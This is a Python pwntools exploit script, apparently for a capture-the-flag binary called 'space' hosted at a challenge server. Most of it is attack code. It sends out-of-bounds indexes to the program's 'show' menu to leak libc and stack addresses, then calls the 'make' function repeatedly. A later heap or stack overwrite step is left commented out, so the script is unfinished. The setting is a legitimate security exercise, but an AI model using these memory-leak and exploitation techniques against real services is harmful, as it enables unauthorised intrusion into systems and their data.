#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys

exe = context.binary = ELF('./space')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50016)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv,aslr=True, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

def make(fname,lname,fuck,fuck2,year=1992,month=2000,day=0,commentlen=10,comment=''):
	io.sendlineafter('> ','1')
	io.sendlineafter('name: ',fname)
	io.sendlineafter('name: ',lname)
	io.sendlineafter('[y]: ',fuck[0])
	if fuck[0]=='y':
		io.sendlineafter(':',str(year))
		io.sendlineafter(':',str(month))
		io.sendlineafter(':',str(day))
	io.sendlineafter('[y]: ',fuck2[0])
	if fuck2[0] == 'y':
		io.sendlineafter(':',str(commentlen))
		io.sendlineafter(':',comment)
	io.sendlineafter('[y/n]','n')

def delete():
	io.sendlineafter('> ','4')
	io.sendlineafter('[y/n]','n')

def show(idx):
	io.sendlineafter('> ', '3')
	io.sendlineafter('user: ',str(idx))

def launch():
	io.sendlineafter('> ','5')
	io.sendlineafter('[y/n]','n')
mainarena_offset = 0x3ebc40

show(38)
io.recvuntil('Last name: ')
libc.address = u64(io.recvn(6)+'\x00\x00') - (0x7fe48aceb8d0 - 0x7fe48ab51000) 
log.info('Libc base {}'.format(hex(libc.address)))
io.sendlineafter('[y/n]','n')
show(-28)
io.recvuntil('First name: ')
stack_leak = u64(io.recvn(6)+'\x00\x00')
log.info('Stack leak {}'.format(hex(stack_leak)))
for i in range(14):
	make('HKHK','HKHK','n','n')
pause()
show(-10)
#io.recvuntil('First name: ')
#stack_leak = u64(io.recvn(6)+'\x00\x00')
#print(hex(stack_leak))
#make('HKHK','HKHK','y','y',year=10,month=10,day=10,commentlen=p64((stack_leak-0xdcd)-0x50), comment='AAAAAAAA')
#delete()

io.interactive()
